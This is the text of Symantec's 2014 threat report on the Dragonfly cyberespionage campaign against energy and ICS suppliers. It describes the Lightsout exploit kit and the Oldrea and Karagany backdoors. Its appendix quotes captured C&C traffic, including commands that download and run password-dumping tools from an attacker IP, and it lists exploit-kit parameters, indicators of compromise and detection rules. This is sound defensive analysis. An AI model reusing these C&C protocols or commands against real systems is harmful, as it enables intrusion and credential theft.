{
    "id": "ac660ce1-a896-4944-9939-c561afa715d1",
    "created_at": "2022-10-25T16:48:24.302764Z",
    "updated_at": "2025-03-27T02:11:39.85372Z",
    "deleted_at": null,
    "sha1_hash": "1856b8232153c3cc879662288b34b4a660586a9a",
    "title": "Dragonfly: Cyberespionage Attacks Against Energy Suppliers",
    "authors": "Symantec",
    "file_creation_date": "2014-07-07T12:54:52Z",
    "file_modification_date": "2014-07-07T12:54:54Z",
    "file_size": 2885807,
    "plain_text": "### SECURITY RESPONSE\n\n# Dragonfly: Cyberespionage Attacks Against Energy Suppliers\n\n###### Symantec Security Response\n\n Version 1.21: July 7, 2014, 12:00 GMT\n\n#### Dragonfly initially targeted defense and aviation companies in the US and Canada before shifting its focus to US and European energy firms in early 2013.\n\n\n-----\n\n### CONTENTS\n\n###### OVERVIEW...................................................................... 3 Timeline.......................................................................... 5 Victims........................................................................... 5 Tools and tactics............................................................ 6 Spam campaign........................................................ 6 Watering hole attacks.............................................. 6 Trojanized software.................................................. 7 Source time zone........................................................... 7 Conclusion...................................................................... 8 Appendix - Technical Description................................ 10 Lightsout exploit kit............................................... 10 Backdoor.Oldrea..................................................... 11 Registry modifications........................................... 11 Trojan.Karagany..................................................... 13 Indicators of compromise............................................ 15 Lightsout exploit kit .............................................. 15 Backdoor.Oldrea .................................................... 16 Trojan.Karagany ..................................................... 17\n\n\n-----\n\n### OVERVIEW\n\n###### A cyberespionage campaign against a range of targets, mainly in the energy sector, gave attackers the ability to mount sabotage operations against their victims. The attackers, known to Symantec as Dragonfly, managed to compromise a number of strategically important organizations for spying purposes and, if they had used the sabotage capabilities open to them, could have caused damage or disruption to the energy supply in the affected countries.\n\n The Dragonfly group, which is also known by other vendors as Energetic Bear, are a capable group who are evolving over time and targeting primarily the energy sector and related industries. They have been in operation since at least 2011 but may have been active even longer than that. Dragonfly initially targeted defense and aviation companies in the US and Canada before shifting its focus to US and European energy firms in early 2013. More recent targets have included companies related to industrial control systems. \n\n Dragonfly has used spam email campaigns and watering hole attacks to infect targeted organizations. The group has used two main malware tools: Trojan.Karagany and Backdoor.Oldrea. The latter appears to be a custom piece of malware, either written by or for the attackers.\n\n\n-----\n\n### TIMELINE\n\n## A newer approach used by the attackers involves compromising the update site for several industrial control system (ICS) software producers.\n\n\n-----\n\n#### Timeline\n\n_Figure 1. Timeline of Dragonfly operations_\n\nSymantec observed spear phishing attempts in the form of emails with PDF attachments from February 2013\nto June 2013. The email topics were related to office administration issues such as dealing with an account or\nproblems with a delivery. Identified targets of this campaign were mainly US and UK organizations within the\nenergy sector.\n\nIn May 2013, the attackers began to use the Lightsout exploit kit as an attack vector, redirecting targets from\nvarious websites. The use of the Lightsout exploit kit has continued to date, albeit intermittently. The exploit kit\nhas been upgraded over time with obfuscation techniques. The updated version of Lightsout became known as\nthe Hello exploit kit.\n\nA newer approach used by the attackers involves compromising the update site for several industrial control\nsystem (ICS) software producers. They then bundle Backdoor.Oldrea with a legitimate update of the affected\nsoftware. To date, three ICS software producers are known to have been compromised.\n\nThe Dragonfly attackers used hacked websites to host command-and-control (C&C) software.\nCompromised websites appear to consistently use some form of content management system.\n\n#### Victims\n\nThe current targets of the Dragonfly group,\nbased on compromised websites and hijacked\nsoftware updates, are the energy sector and\nindustrial control systems, particularly those\nbased in Europe. While the majority of victims\nare located in the US, these appear to mostly\nbe collateral damage. That is, many of these\ncomputers were likely infected either through\nwatering hole attacks or update hijacks and\nare of no interest to the attacker.\n\nBy examining victims with active infections –\nwhere additional malicious activity has been\ndetected – it is possible to gather a more\naccurate picture of ‘true’ victims.\n\nThe most active infections, as in Figure 2, are _Figure 2. Top 10 countries by active infection_\n\n\n-----\n\nin Spain, followed in order by the US, France, Italy, and Germany.\n\n#### Tools and tactics\n\nDragonfly uses two main pieces of malware in its attacks. Both are Remote Access Tool (RAT) type malware\nwhich provide the attackers with access and control of compromised computers. Dragonfly’s favored malware\ntool is Backdoor.Oldrea, which is also known as Havex or the Energetic Bear RAT. Oldrea acts as a back door for\nthe attackers on to the victim’s computer, allowing them to extract data and install further malware.\n\nOldrea appears to be custom malware, either written by the group itself or created for it. This provides some\nindication of the capabilities and resources behind the Dragonfly group. The second main tool used by Dragonfly\nis Trojan.Karagany. Unlike Oldrea, Karagany was available on the underground market. The source code for\nversion 1 of Karagany was leaked in 2010. Symantec believes that Dragonfly may have taken this source code\nand modified for its own use.\n\nSymantec found that the majority of computers compromised by the attackers were infected with Oldrea.\nKaragany was only used in around 5 percent of infections. The two pieces of malware are similar in functionality\nand what prompts the attackers to choose one tool over another remains unknown.\n\n##### Spam campaign\n\nThe Dragonfly group has\nused at least three infection\ntactics against targets in the\nenergy sector. The earliest\nmethod was an email spear\nphishing campaign, which saw\nselected executives and senior\nemployees in target companies\nreceive emails containing a\nmalicious PDF attachment.\nInfected emails had one of two\nsubject lines: “The account”\nor “Settlement of delivery\nproblem”. All of the emails were\nfrom a single Gmail address.\nFigure 3 displays the number of\ndifferent recipients per day.\n\nThe spam campaign began in\nFebruary 2013 and continued\ninto June 2013. Symantec _Figure 3. Spam campaign activity from mid-February 2014 to mid-June 2013_\nidentified seven different\norganizations targeted in this\ncampaign. At least one organization was attacked intermittently for a period of 84 days.\n\n##### Watering hole attacks\n\nIn June 2013, the attackers shifted their focus to watering hole attacks. They compromised a number of energy-\nrelated websites and injected an iframe into each of them. This iframe then redirected visitors to another\ncompromised legitimate website hosting the Lightsout exploit kit. This in turn exploited either Java or Internet\nExplorer in order to drop Oldrea or Karagany on the victim’s computer. The fact that the attackers compromised\nmultiple legitimate websites for each stage of the operation is further evidence that the group has strong\ntechnical capabilities.\n\n\n-----\n\nIn September 2013,\nDragonfly began using\na new version of this\nexploit kit, known as the\nHello exploit kit. The\nlanding page for this kit\ncontains JavaScript which\nfingerprints the system,\nidentifying installed\nbrowser plugins. The\nvictim is then redirected\nto a URL which in turn\ndetermines the best\nexploit to use based on\nthe information collected.\n\nFigure 4 shows the\ncompromised websites\ncategorized into their\nrespective industries.\nFifty percent of identified\ntargets were energy\n\n_Figure 4. Targeted industries over time_\n\nindustry related and\nthirty percent were\nenergy control systems, as shown in Figure 4. A clear shift in the attackers targeting can be seen in March 2014\nwhen energy control systems become the primary target.\n\n##### Trojanized software\n\nThe most ambitious attack vector used by Dragonfly was the compromise of a number of legitimate software\npackages. Three different ICS equipment providers were targeted and malware was inserted into the software\nbundles they had made available for download on their websites.\n\n#### Source time zone\n\nAnalysis of the compilation timestamps\non the malware used by the attackers\nindicate that the group mostly worked\nbetween Monday and Friday, with activity\nmainly concentrated in a nine-hour period\nthat corresponded to a 9am to 6pm\nworking day in the UTC +4 time zone.\n\n_Figure 5. Number of samples compiled per hour, UTC time zone_\n\n\n-----\n\n_Figure 6. Number of samples compiled per day, UTC time zone_\n\n#### Conclusion\n\nThe Dragonfly group is technically adept and able to think strategically. Given the size of some of its targets, the\ngroup found a “soft underbelly” by compromising their suppliers, which are invariably smaller, less protected\ncompanies.\n\n\n-----\n\n### APPENDIX\n\n\n-----\n\n|Table 1. Examples of file names for one implementation of the Lightsout exploit kit|Col2|Col3|\n|---|---|---|\n|Page|Description|CVE|\n|Inden2i.php|First landing page|N/A|\n|Inden2i.html|Second landing page|N/A|\n|PluginDetect.js|PluginDetect script|N/A|\n|Stoh.html|Java 6 exploit Jar request file|N/A|\n|Stoh.jar|Java 6 Exploit|CVE-2012-1723|\n|Gami.html|Java 7 exploit Jar request file|N/A|\n|Gami.jar|Java 7 exploit|CVE-2013-2465|\n|Tubc.html|IE7 Exploit|CVE-2012-4792|\n|Negc.html|IE8 Exploit|CVE-2013-1347|\n\n\n#### Appendix - Technical Description\n\nIdentification of this group is based on the use of two malware families and an exploit kit. The malware families\nutilized are Backdoor.Oldrea and Trojan.Karagany. The exploit kit is known as Lightsout and/or Hello. Hello is an\nupdated iteration of Lightsout that the Dragonfly group began to use in September 2013.\n\nUse of Backdoor.Oldrea appears to be limited to the Dragonfly group. In addition, specific instances of Trojan.\nKaragany have been used by this group. Karagany is a Russian RAT sold on underground forums. Instances of\nthis malware related to the Dragonfly group are identified based on them being delivered through the Lightsout\nexploit kit and also a particular packer that this group used. Symantec detects the Trojan.Karagany packer used\n[by this group as Trojan.Karagany!gen1.](http://www.symantec.com/security_response/writeup.jsp?docid=2014-061601-3811-99)\n\nThe Lightsout exploit kit is a simple exploit kit that is consistently used to deliver primarily Backdoor.Oldrea and,\nin several instances, Trojan.Karagany.\n\n##### Lightsout exploit kit\n\nA number of sites that use content\nmanagement systems were exploited and\nan iframe was used in order to redirect\nvisitors to sites hosting the Lightsout\nexploit kit.\n\nAn example of an injected iframe can be\nseen in figure 7.\n\n_Figure 7. Example of injected iframe link_\n\nThe exploit kit uses browser (e.g.\nInternet Explorer and Firefox) and Java\nexploits in order to deliver either Backdoor.Oldrea or Trojan.Karagany.\n\nAn example of the structure of the Lightsout exploit kit can be seen Table 1. Note that file names and exploits\nused may vary.\n\nIn September 2013, the _Table 1. Examples of file names for one implementation of the Lightsout exploit kit_\nDragonfly group began\n\nPage Description CVE\n\nusing a new version of\nLightsout, also known Inden2i.php First landing page N/A\n[as the Hello exploit kit.](http://vrt-blog.snort.org/2014/03/hello-new-exploit-kit.html) Inden2i.html Second landing page N/A\nThe JavaScript included\n\nPluginDetect.js PluginDetect script N/A\n\nin the landing page\nredirects the browser Stoh.html Java 6 exploit Jar request file N/A\nto a URL that depends Stoh.jar Java 6 Exploit CVE-2012-1723\non the fonts installed\n\nGami.html Java 7 exploit Jar request file N/A\n\non the system, browser\nadd-ons, the OS version, Gami.jar Java 7 exploit CVE-2013-2465\nand the user agent. At Tubc.html IE7 Exploit CVE-2012-4792\nthis point, it determines Negc.html IE8 Exploit CVE-2013-1347\nthe best exploit to\nuse, based on the\ninformation provided, and generates an appropriate URL to redirect the user to the appropriate exploit/payload.\n\nThe following shows an example of such a request:\n```\n           [http://]compromised.example/wp-includes/pomo/\n           dtsrc.php?a=[EK _ DETERMINED _ PARAMETER]\n\n```\n\n-----\n\n|Table 2. Lightsout exploit kit parameters|Col2|\n|---|---|\n|Page|Description|\n|H2|Java Exploit (<v1.7.17)|\n|H3|Chrome /w Java (<1.7.17)|\n|H4|IE6 & OSVer < Vista – 6|\n|H5|Java Exploit (<v1.7.17 & OSver < Vista)|\n|H6|IE8 & OSVer < Vista|\n|H7|Java Exploit (<=v1.6.32)|\n|R2|Malicious JAR file|\n|R7|Malicious JAR file|\n|Dwe|Malicious PE file|\n|Dwd|Malicious PE file|\n\n\n\n[EK_DETERMINED_PARAMETER] may be anything _Table 2. Lightsout exploit kit parameters_\nlisted in Table 2.\n\nPage Description\n\nThe parameters dwe and dwd relate to which H2 Java Exploit (<v1.7.17)\npayload is requested for download, for example: H3 Chrome /w Java (<1.7.17)\n\n        - When a Backdoor.Oldrea payload is requested H4 IE6 & OSVer < Vista – 6\n\n[EK_DETERMINED_PARAMETER] is dwd H5 Java Exploit (<v1.7.17 & OSver < Vista)\n\n        - When a Karagany!gen1 payload is requested H6 IE8 & OSVer < Vista\n\n[EK_DETERMINED_PARAMETER] is dwe\n\nH7 Java Exploit (<=v1.6.32)\n\nThe values of the [EK_DETERMINED_PARAMETER] R2 Malicious JAR file\nvariable may relate to the two different file types\n\nR7 Malicious JAR file\n\nrepresented by Backdoor.Oldrea and Trojan.\nKaragany!gen1 payloads. Oldrea payloads are DLL Dwe Malicious PE file\nfiles (URLs end in “d” for DLL?) while Karagany!gen1 Dwd Malicious PE file\npayloads are portable executables (URLs end in “e”\nfor EXE?).\n\n##### Backdoor.Oldrea\n\nAt the core of Backdoor.Oldrea is a persistent component that interacts with C&C servers to download and\nexecute payloads. The components are downloaded by reaching out to the C&C server and performing a GET\nrequest which returns an HTML page containing a base64 encoded string between two comments marked with\nthe ‘havex’ string.\n\n###### Installation\n\n File system modifications\n\n       - %Temp%\\qln.dbx\n\n       - %System%\\TMPprovider038.dll\n\n##### Registry modifications\n\nIn this specific example, the ‘038’ in the file name indicates the major version number.\n\n       - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\”TmProvider”\n\n       - HKEY_LOCAL_MACHINE\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\”TmProvider”\n\n        - HKEY_LOCAL_MACHINE\\ SOFTWARE\\Microsoft\\Internet Explorer\\InternetRegistry\\”fertger”\n\n        - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\InternetRegistry\n\n###### Code injection\n\n         - Backdoor.Oldrea injects code into explorer.exe.\n\n###### Networking\n\nPost infection, Backdoor.Oldrea will attempt to collect system information such as OS, user name, computer\nname, country, language, nation, Internet adapter configuration information, available drives, default browser,\nrunning processes, desktop file list, My Documents, Internet history, program files, and root of available drives.\nIt also collects data from Outlook (address book) and ICS related software configuration files. This data is\ncollected and written to a temporary file in an encrypted form before it is POST’ed to a remote C&C server. The\nfollowing are examples of a POST request and a POST response:\n\n\n-----\n\nPOST request example:\n```\n           POST /wp08/wp-includes/dtcla.php?id=285745296322896178920098FD80-20&v1=038&v2=17\n           0393861&q=5265882854508EFCF958F979E4 HTTP/1.1\n           User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19\n           (KHTML, like Gecko) Chrome/1.0.154.36 Safari/525.19\n           Host: toons.freesexycomics.com\n           Content-Length: 0\n           Cache-Control: no-cache\n\n```\nPOST response example:\n```\n           HTTP/1.1 200 OK\n           Date: Wed, 22 Jan 2014 13:40:48 GMT\n           Content-Type: text/html\n           Transfer-Encoding: chunked\n           Connection: keep-alive\n           Server: Apache/1.3.37 (Unix)\n           Cache-Control: no-cache\n           9f65\n           <html><head><mega http-equiv=’CACHE-CONTROL’ content=’NO-CACHE’></\n           head><body>No data!<!--havexQlpoOTFBWSZTWWYvDI0BOsD////////////////////////////////////\n           /////////4oB+93VVXu69DuN7XYzds9yt49Ques\n           [...TRUNCATED FOR READABILITY]\n           +yUW3zfTxWAOstsCwCckdW5 AH5Q6vbbCu7GputPt5CSfgPCAKXcAOOICMsqliACGYEhAQT3v9eD\n           M92D/8XckU4UJBmLwyNA==havex--></body></head>\n\n```\nVarious samples process the C&C responses differently.\n\nIn one example, the sample searches for the data enclosed by the tag ‘havex’. Once the data is found, it is\ndecoded using standard base64 + bzip2 and also a xor layer with bytes from the string 1312312. The decoded\ndata contains a small header followed by an executable MZ-file.\n\nAnother sample was found to use standard base64 + reverse xor + RSA-2048 for decrypting received data. The\ndecrypted data consists of a 6 byte command concatenated with an MZ file. The MZ file is compressed with the\nlzma algorithm. RSA keys for decryption, together with other initial configuration information, are stored in the\nregistry in base64 form.\n\n###### Payloads\n\nThis section includes information about identified payloads downloaded by Backdoor.Oldrea.\n\nThe following is a brief description of the functionality for each identified component:\n\n**• Tmpprovider is a persistent component that interacts with the C&C server (downloads and executes payloads).**\n\n        - The InstallerFormDll component usually embeds another executable (DLL) in its resource section to be\nloaded. The sample analyzed carried a Web browser password recovery tool originating from\nhttp://securityxploded.com/browser-password-decryptor.php\n\n        - The RunExeCmdSingle component is a DLL file that drops and executes another executable. The export\n‘runDll’ of this file is where the logic is implemented.\n\n**• DropCommandsCmd is a cleanup module, used to remove traces of itself from the infected computer.**\n\n         - The GetFileCmd modules check for the existence of specific files on the infected host. The two samples look\nfor the ICS related software file and Outlook’s autocomplete address book file (outlook.nk2).\n\n\n-----\n\n##### Trojan.Karagany\n\nTrojan.Karagany is a back door used primarily for recon. It is designed to download and install additional files\nand exfiltrate data. Samples sometimes use common binary packers such as UPX and Aspack on top of a custom\nDelphi binary packer/protector for the payload. Where present in samples, the Delphi packer is configured to use\n‘neosphere’ as a key to decrypt the payload.\n\nThe following is a brief overview of the functionality of Trojan.Karagany:\n\n        - Can upload, download, and execute files on the system\n\n         - Has plugin capability (may load several plugins for added functionality, such as Web injects)\n\n        - Payload is approximately 72Kb in size and is programmed in C/C++\n\n        - Contains a small embedded DLL file, which monitors WSASend and send APIs for capturing ‘Basic\nAuthentication’ credentials\n###### Installation\n\nTrojan.Karagany creates a folder in the user APPDATA directory and chooses the directory name from the\nfollowing list:\n\n        - Microsoft WCF services\n\n        - Broker services\n\n         - Flash Utilities\n\n        - Media Center Programs\n\n         - Policy Definitions\n\n        - Microsoft Web Tools\n\n        - Reference Assemblies\n\n        - Analysis Services\n\n         - InstallShield Information\n\n        - IIS SQL Server\n\n        - Diagnostics\n\n        - NTAPI Performance\n\n        - WPF Platform\n\nIt copies itself in the created directory with hidden and system attributes using a file name chosen from the\nfollowing list:\n\n        - SearchIndexer.exe\n\n        - ImeBroker.exe\n\n         - fsutil.exe\n\n        - PnPutil.exe\n\n        - BdeUISrv.exe\n\n        - WinSAT.exe\n\n        - pwNative.exe\n\n        - SnippingTool.exe\n\n        - DFDWizard.exe\n\n        - PrintBrmEngine.exe\n\n       - WbemMonitor.exe\n\n        - dxpserver.exe\n\n       - PowerMng.exe\n\n\n-----\n\nTrojan.Karagany copies itself with hidden and system attributes where it was first executed as err.log[DIGITS]. It\nthen copies the legitimate chkdsk utility in the installation folder using the payload file name but with a space before\nthe file extension. This may fool ordinary users into thinking that this folder contains a legitimate application, for\nexample PnPutil .exe. Trojan.Karagany!gen1 may create the following additional files in the installation folder:\n\n        - Form.api\n\n         - inact.api\n\n        - prog.cer\n\n        - Cent.api\n\n        - ie.pdb\n\nIt then creates a C:\\ProgramData\\Mail\\MailAg\\gl directory as a temporary directory used for uploading files.\nTrojan.Karagany then creates a link to itself in the Startup folder as an autostart when the system restarts.\n\n###### Networking\n\nTrojan.Karagany first checks for a live Internet connection by visiting Microsoft or Adobe websites. It will only reach\nout to its C&C server once this check is successful.\n\n###### Example HTTP Requests\n\nInternet connection test to Microsoft\n```\n           GET /en-us/default.aspx HTTP/1.1\n\n```\nAccept-Encoding: gzip, deflate\n```\n            Content-Type: application/x-www-form-urlencoded\n            Host: microsoft.com\n            Cookie: MC1=V=3&GUID=<32 character guid>\n            Connection: Keep-Alive\n            Cache-control: no-cache\n\n```\nInternet connection test to Adobe using identifiant parameter\n```\n           POST /geo/productid.php HTTP/1.1\n            Content-Type: application/x-www-form-urlencoded\n            Host: adobe.com\n            ...\n\n```\nidentifiant=51032 _ 175129256364\n\nExample POST request for C&C server check-in\n```\n           POST /check _ value.php HTTP/1.1\n            User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; .NET CLR\n            2.0.50727)\n            Host: 93.188.161.235\n            ...\n\n```\nidentifiant=51032 _ 1799883375637&version=i2pver\n\nHTTP response example\n```\n           HTTP/1.1 200 OK\n            Date: Tue, 28 Jan 2014 05:59:58 GMT\n            Vary: Accept-Encoding\n            Content-Length: 324\n            Content-Type: text/html\n            X-Powered-By: PHP/5.3.10-1ubuntu3.9\n            Via: 1.1 host.alexsieff.com\n            work:3|downexec [http://]93.188.161.235/check2/muees27jxt/shot.jpg;\n            work:5|downexec [http://]93.188.161.235/check2/muees27jxt/tl.jpg;\n\n```\nwork:7|downexec [http://]93.188.161.235/check2/muees27jxt/fl.jpg;\n```\n            work:103|downexec [http://]93.188.161.235/check2/muees27jxt/pdump.jpg;\n\n```\nwork:118|downexec [http://]93.188.161.235/check2/muees27jxt/fl.jpg;\n\n\n-----\n\n|ghtsout exploit kit Watering holes|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|Table 3. Detected exploit sites hosting the Lightsout exploit kit and referrer|||||\n|Infected website|Infected website industry|Infected website nationality|Exploit site|Last Seen|\n|www.s[REDACTED]e.az|File hosting service|Azerbaijan|blog.olioboard.com|18/06/2014 01:19|\n|www.t[REDACTED]e.no|Energy control systems|Norwegian|www.manshur.ir|24/05/2014 10:53|\n|www.s[REDACTED]e.az|File hosting service|Azerbaijan|realstars.ir|06/05/2014 22:20|\n|s[REDACTED]e.az|File hosting service|Azerbaijan|realstars.ir|06/05/2014 23:30|\n|www.f[REDACTED]y.com|Energy|American|aptguide.3dtour.com|11/04/2014 12:26|\n|www.t[REDACTED]e.no|Energy control systems|Norwegian|seductionservice.com|07/04/2014 06:42|\n|www.a[REDACTED]t.it|Energy control systems|Italian|seductionservice.com|06/04/2014 22:25|\n|www.e[REDACTED]t.it|Energy control systems|Italian|seductionservice.com|05/04/2014 22:57|\n|b[REDACTED]n.in|Energy control systems|Indian|mahsms.ir|23/03/2014 23:01|\n|www.v[REDACTED]z.com|Energy|French|mahsms.ir|21/03/2014 22:30|\n|www.r[REDACTED]e.fr|Energy|French|mahsms.ir|14/03/2014 04:30|\n|www.e[REDACTED]m.eu|Energy|French|aptguide.3dtour.com|04/03/2014 21:27|\n|www.r[REDACTED]e.fr|Energy|French|keeleux.com|30/11/2013 06:57|\n|www.v[REDACTED]z.com|Energy|French|keeleux.com|11/10/2013 12:18|\n\n\nThe POST data contains the operating system version and a derived number:\n\n        - identifiant=[OS VERSION]_[DERIVED NUMBER]\n\nUser-Agent tokens used in C&C requests are hard-coded. The following two examples have been observed:\n\n        - Mozilla/17.0 (compatible; MSIE 8.0; Windows NT 6.1; .NET CLR 2.0.50727; .NET CLR 3.5.30729)\n\n        - Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; .NET CLR 2.0.50727; .NET CLR 3.5.30729)\n\n###### Downloaded components\n\n**• pdump.jpg - Used for dumping passwords into \\ProgramData\\Mail\\MailAg\\pwds.txt. Needs ‘vaultcli.dll’ library**\n\n**• fl.txt - Used for listing RTF, PST, DOC, XLS, PDF, *pass*.*, *secret*.* files into \\ProgramData\\Mail\\MailAg\\fls.txt**\n\n**• tl.jpg - Used to list running task using ‘tasklist’ utility**\n\n**• shot.jpg - Used for desktop screenshot, file is saved into \\ProgramData\\Mail\\MailAg\\shot.png**\n\n#### Indicators of compromise\n\n##### Lightsout exploit kit\n\n###### Watering holes\n\n_Table 3. Detected exploit sites hosting the Lightsout exploit kit and referrer_\n\nInfected website Infected website Infected Exploit site Last Seen\nindustry website\nnationality\n\nwww.s[REDACTED]e.az File hosting service Azerbaijan blog.olioboard.com 18/06/2014 01:19\n\nwww.t[REDACTED]e.no Energy control systems Norwegian www.manshur.ir 24/05/2014 10:53\n\nwww.s[REDACTED]e.az File hosting service Azerbaijan realstars.ir 06/05/2014 22:20\n\ns[REDACTED]e.az File hosting service Azerbaijan realstars.ir 06/05/2014 23:30\n\nwww.f[REDACTED]y.com Energy American aptguide.3dtour.com 11/04/2014 12:26\n\nwww.t[REDACTED]e.no Energy control systems Norwegian seductionservice.com 07/04/2014 06:42\n\nwww.a[REDACTED]t.it Energy control systems Italian seductionservice.com 06/04/2014 22:25\n\nwww.e[REDACTED]t.it Energy control systems Italian seductionservice.com 05/04/2014 22:57\n\nb[REDACTED]n.in Energy control systems Indian mahsms.ir 23/03/2014 23:01\n\nwww.v[REDACTED]z.com Energy French mahsms.ir 21/03/2014 22:30\n\nwww.r[REDACTED]e.fr Energy French mahsms.ir 14/03/2014 04:30\n\nwww.e[REDACTED]m.eu Energy French aptguide.3dtour.com 04/03/2014 21:27\n\nwww.r[REDACTED]e.fr Energy French keeleux.com 30/11/2013 06:57\n\nwww.v[REDACTED]z.com Energy French keeleux.com 11/10/2013 12:18\n\n\n-----\n\n|Table 4. Recent Oldrea C&C servers detected by Symantec|Col2|Col3|\n|---|---|---|\n|Hostname|First Seen|Last Seen|\n|a[REDACTED]e.com|25/02/2014 15:57|23/06/2014 21:06|\n|e[REDACTED]k.ru|25/02/2014 18:47|23/06/2014 20:51|\n|r[REDACTED]r.ru|25/02/2014 15:44|23/06/2014 17:21|\n|l[REDACTED]l.net|25/02/2014 15:54|23/06/2014 12:51|\n|c[REDACTED]b.ru|25/02/2014 22:37|23/06/2014 12:13|\n|l[REDACTED]r.ru|05/03/2014 14:00|22/06/2014 22:06|\n|p[REDACTED]3.ru|11/06/2014 03:34|22/06/2014 06:18|\n|r[REDACTED]a.com|30/04/2014 00:07|17/06/2014 22:57|\n|7[REDACTED]t.com|26/02/2014 09:43|13/06/2014 08:59|\n|s[REDACTED]s.com|29/04/2014 23:43|13/06/2014 02:55|\n|www.r[REDACTED]l.com|05/03/2014 19:18|19/03/2014 17:21|\n|w[REDACTED]c.org|26/02/2014 04:51|11/03/2014 23:30|\n|s[REDACTED]s.com|06/09/2013 04:03|16/01/2014 23:54|\n|s[REDACTED]f.com.ua|14/01/2014 21:46|16/01/2014 22:49|\n|d[REDACTED]k.com|14/01/2014 08:46|16/01/2014 22:48|\n|z[REDACTED]k.com|14/01/2014 21:47|16/01/2014 22:47|\n|blog.o[REDACTED]d.com|19/09/2013 07:12|16/01/2014 22:40|\n|a[REDACTED]l.com|06/09/2013 04:41|16/01/2014 20:52|\n|a[REDACTED]r.com|19/09/2013 01:44|15/01/2014 05:57|\n|k[REDACTED]x.com|20/09/2013 00:22|26/09/2013 04:25|\n|blog.k[REDACTED]x.com|20/09/2013 04:04|25/09/2013 07:57|\n|dl.3[REDACTED]e.com|28/08/2013 06:38|06/09/2013 10:07|\n|j[REDACTED]p.co.jp|28/08/2013 06:33|06/09/2013 09:37|\n|s[REDACTED]e.net|28/08/2013 09:12|06/09/2013 03:54|\n\n\n###### Detection for HTTP request of Lightsout payload\n\nRegular expression for URL or HTTP request-line searches:\n\n        - [^=]*=(dw[de]|fn[de])$\n\n##### Backdoor.Oldrea\n\n_Table 4. Recent Oldrea C&C servers detected by Symantec_\n\nHostname First Seen Last Seen\n\na[REDACTED]e.com 25/02/2014 15:57 23/06/2014 21:06\n\ne[REDACTED]k.ru 25/02/2014 18:47 23/06/2014 20:51\n\nr[REDACTED]r.ru 25/02/2014 15:44 23/06/2014 17:21\n\nl[REDACTED]l.net 25/02/2014 15:54 23/06/2014 12:51\n\nc[REDACTED]b.ru 25/02/2014 22:37 23/06/2014 12:13\n\nl[REDACTED]r.ru 05/03/2014 14:00 22/06/2014 22:06\n\np[REDACTED]3.ru 11/06/2014 03:34 22/06/2014 06:18\n\nr[REDACTED]a.com 30/04/2014 00:07 17/06/2014 22:57\n\n7[REDACTED]t.com 26/02/2014 09:43 13/06/2014 08:59\n\ns[REDACTED]s.com 29/04/2014 23:43 13/06/2014 02:55\n\nwww.r[REDACTED]l.com 05/03/2014 19:18 19/03/2014 17:21\n\nw[REDACTED]c.org 26/02/2014 04:51 11/03/2014 23:30\n\ns[REDACTED]s.com 06/09/2013 04:03 16/01/2014 23:54\n\ns[REDACTED]f.com.ua 14/01/2014 21:46 16/01/2014 22:49\n\nd[REDACTED]k.com 14/01/2014 08:46 16/01/2014 22:48\n\nz[REDACTED]k.com 14/01/2014 21:47 16/01/2014 22:47\n\nblog.o[REDACTED]d.com 19/09/2013 07:12 16/01/2014 22:40\n\na[REDACTED]l.com 06/09/2013 04:41 16/01/2014 20:52\n\na[REDACTED]r.com 19/09/2013 01:44 15/01/2014 05:57\n\nk[REDACTED]x.com 20/09/2013 00:22 26/09/2013 04:25\n\nblog.k[REDACTED]x.com 20/09/2013 04:04 25/09/2013 07:57\n\ndl.3[REDACTED]e.com 28/08/2013 06:38 06/09/2013 10:07\n\nj[REDACTED]p.co.jp 28/08/2013 06:33 06/09/2013 09:37\n\ns[REDACTED]e.net 28/08/2013 09:12 06/09/2013 03:54\n\n###### Detection for Oldrea HTTP C&C requests\n\n        - \\.php\\?id=[0-9A-F]{28}.{0,5}&v1=[0-9]{1,5}&v2=[0-9]{1,10}&q=[0-9A-F]{20}\n\n###### Detection for files created during installation\n\nRegular expression for file system searches:\n\n         - (TMPprovider[0-9]{3}\\.dll|sy[ds]main\\.dll)\n\n\n-----\n\n###### Registry changes made during installation\n\n       - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\”TmProvider”\n\n       - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\”TmProvider”\n\n##### Trojan.Karagany\n\n        - 91.203.6.71\n\n        - 93.171.216.118\n\n        - 93.188.161.235\n\n###### Format of data initial POST request made to C&C server\n\n        - identifiant=[OS VERSION]_[DERIVED NUMBER]\n\n###### HTTP requests for uploading data with the format:\n\n        - filename=[FILE NAME]&identifiant=[INFO DERIVED FROM OS]&fichier=[ENCODED DATA FROM FILE]\n\n###### Yara rule\n\nKaragany Yara rule:\n```\n           private rule isPE\n           {\n                 condition:\n                    uint16(0) == 0x5A4D and uint32(uint32(0x3c)) == 0x00004550\n           }\n           rule Trojan _ Karagany\n           {\n                 meta:\n                    alias = “Dreamloader”\n                 strings:\n                    $s1 = “neosphere” wide ascii\n                    $s2 = “10000000000051200” wide ascii\n\n```\n$v1 = “&fichier” wide ascii\n$v2 = “&identifiant” wide ascii\n```\n                    $c1 = “xmonstart” wide ascii\n                    $c2 = “xmonstop” wide ascii\n\n```\n$c3 = “xgetfile” wide ascii\n```\n                    $c4 = “downadminexec” wide ascii\n                    $c5 = “xdiex” wide ascii\n                    $c6 = “xrebootx” wide ascii\n                 condition:\n                    isPE and (($s1 and $s2) or ($v1 and $v2) or (any of ($c*)))\n           }\n\n```\n\n-----\n\n##### Authors\n###### Symantec Security Response ﻿﻿\n\n About Symantec\nSymantec protects the world’s information and is the\nglobal leader in security, backup, and availability solutions.\nOur innovative products and services protect people and\ninformation in any environment—from the smallest mobile\ndevice to the enterprise data center to cloud-based systems.\n\nOur industry-leading expertise in protecting data,\nidentities, and interactions gives our customers confidence\nin a connected world. More information is available at\nwww.symantec.com or by connecting with Symantec at\n\ngo.symantec.com/socialmedia.\n\nHeadquartered in Mountain View, Calif.,\nSymantec has operations in 40 countries.\n[More information is available at www.symantec.com.](http://www.symantec.com)\n\nFor specific country offices and contact numbers, please visit our website.\n\nSymantec World Headquarters Copyright © 2014 Symantec Corporation. All\n350 